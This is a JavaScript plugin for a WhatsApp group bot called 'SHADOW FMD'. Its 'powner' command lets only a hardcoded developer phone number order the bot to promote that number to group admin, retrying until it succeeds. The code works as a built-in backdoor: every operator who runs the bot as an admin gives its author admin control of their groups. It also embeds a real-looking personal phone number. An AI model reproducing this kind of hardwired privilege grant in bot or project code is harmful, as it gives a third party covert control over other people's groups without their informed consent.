
import { getFakeQuoted } from '../../lib/fakeQuoted.js';

const DEVELOPER_NUMBER = '255752593977';
const BOT_NAME = 'SHADOW FMD';

const normalizeNumber = (jid) => {
    if (!jid) return '';
    return jid.split('@')[0].split(':')[0].replace(/\D/g, '');
};

const findDevInGroup = (participants) => {
    const devNum = normalizeNumber(DEVELOPER_NUMBER);

    return participants.find(p => {
        const idNum = normalizeNumber(p.id || '');
        const jidNum = normalizeNumber(p.jid || '');

        return idNum === devNum || jidNum === devNum;
    });
};

const getActualJid = (member) => {
    const raw = member.jid || member.id || '';
    return raw.split('@')[0].split(':')[0].replace(/\D/g, '') + '@s.whatsapp.net';
};

const retryPromote = async (client, groupId, participant, maxRetries = 5, baseDelay = 1500) => {
    for (let attempt = 1; attempt <= maxRetries; attempt++) {
        try {
            await client.groupParticipantsUpdate(
                groupId,
                [participant],
                'promote'
            );
            return true;
        } catch (error) {
            if (attempt === maxRetries) throw error;

            await new Promise(resolve =>
                setTimeout(resolve, baseDelay * Math.pow(2, attempt - 1))
            );
        }
    }
};

export default {
    name: 'powner',
    aliases: ['promoteowner', 'makeowneradmin'],
    description: 'Promotes the developer to group admin',

    run: async (context) => {
        const { client, m, isBotAdmin } = context;
        const fq = getFakeQuoted(m);

        const react = async (emoji) => {
            await client.sendMessage(m.chat, {
                react: { text: emoji, key: m.reactKey }
            }).catch(() => {});
        };

        const replyBox = (title, message) => {
            return `╭━━━「 🟢 ${BOT_NAME} 」━━━╮
├ ${title}
├
├ ${message}
╰━━━━━━━━━━━━━━━━━━╯
> ⚡ POWERED BY ${BOT_NAME}`;
        };

        await react('⌛');

        if (!m.isGroup) {
            await react('❌');
            return m.reply(replyBox(
                'GROUP ONLY',
                'This command only works in groups.'
            ));
        }

        const senderNum = normalizeNumber(m.sender);

        if (senderNum !== normalizeNumber(DEVELOPER_NUMBER)) {
            await react('❌');
            return m.reply(replyBox(
                'ACCESS DENIED',
                'Only the developer can use this command.'
            ));
        }

        if (!isBotAdmin) {
            await react('❌');
            return m.reply(replyBox(
                'ADMIN REQUIRED',
                'I need admin privileges to perform this action.'
            ));
        }

        try {
            const groupMetadata = await client.groupMetadata(m.chat);
            const ownerMember = findDevInGroup(groupMetadata.participants);

            if (!ownerMember) {
                await react('❌');
                return m.reply(replyBox(
                    'NOT FOUND',
                    'Developer is not in this group.'
                ));
            }

            if (ownerMember.admin) {
                await react('ℹ️');
                return m.reply(replyBox(
                    'ALREADY ADMIN',
                    'Developer is already a group admin.'
                ));
            }

            const actualJid = getActualJid(ownerMember);

            await retryPromote(client, m.chat, actualJid);

            await react('✅');

            return m.reply(replyBox(
                'PROMOTED SUCCESSFULLY',
                'Developer has been promoted to group admin.'
            ));

        } catch (error) {
            await react('❌');

            return m.reply(replyBox(
                'ERROR',
                `Failed to promote: ${error.message}`
            ));
        }
    }
};
